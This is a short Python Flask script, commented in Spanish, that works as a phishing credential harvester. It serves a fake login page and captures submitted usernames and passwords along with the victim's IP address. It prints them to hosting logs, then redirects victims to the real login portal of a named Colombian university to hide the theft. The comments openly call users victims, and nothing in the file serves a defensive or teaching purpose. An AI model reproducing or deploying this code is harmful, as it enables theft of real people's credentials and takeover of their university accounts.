from flask import Flask, request, redirect, send_from_directory
import datetime
import os

app = Flask(__name__)

# Ruta para mostrar la página de inicio (index.html)
@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

# Ruta para capturar los datos cuando el usuario presiona "Ingresar"
@app.route('/', methods=['POST'])
def capturar_credenciales():
    # Obtener los datos del formulario de manera limpia y segura
    usuario = request.form.get('usuario', '')
    clave = request.form.get('clave', '')
    
    # Obtener la IP real de la víctima a través de los encabezados de Render
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # IMPRESIÓN DIRECTA Y CLARA EN LOS LOGS DE RENDER
    print("\n" + "="*60)
    print(f"🚨 ¡CREDENCIALES CAPTURADAS EXITOSAMENTE! 🚨")
    print(f"📅 Fecha y Hora: {fecha}")
    print(f"🌐 IP de la Víctima: {ip}")
    print(f"👤 Usuario / Documento: {usuario}")
    print(f"🔑 Contraseña: {clave}")
    print("="*60 + "\n")
    
    # Redirigir de inmediato al portal real de la universidad
    return redirect('https://sigedin.uniputumayo.edu.co/login', code=302)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)